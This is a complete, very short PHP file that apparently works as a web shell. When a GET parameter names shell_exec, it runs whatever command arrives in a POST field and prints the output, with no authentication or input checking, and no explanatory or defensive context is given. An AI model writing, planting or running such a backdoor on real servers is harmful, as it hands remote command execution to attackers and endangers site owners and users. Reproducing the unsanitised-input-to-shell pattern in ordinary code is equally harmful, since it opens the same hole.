<?php
$execfunc = $_GET['func'];

if ($execfunc=="shell_exec") {
	$result=shell_exec($_POST['command']);
	echo $result;
}
?>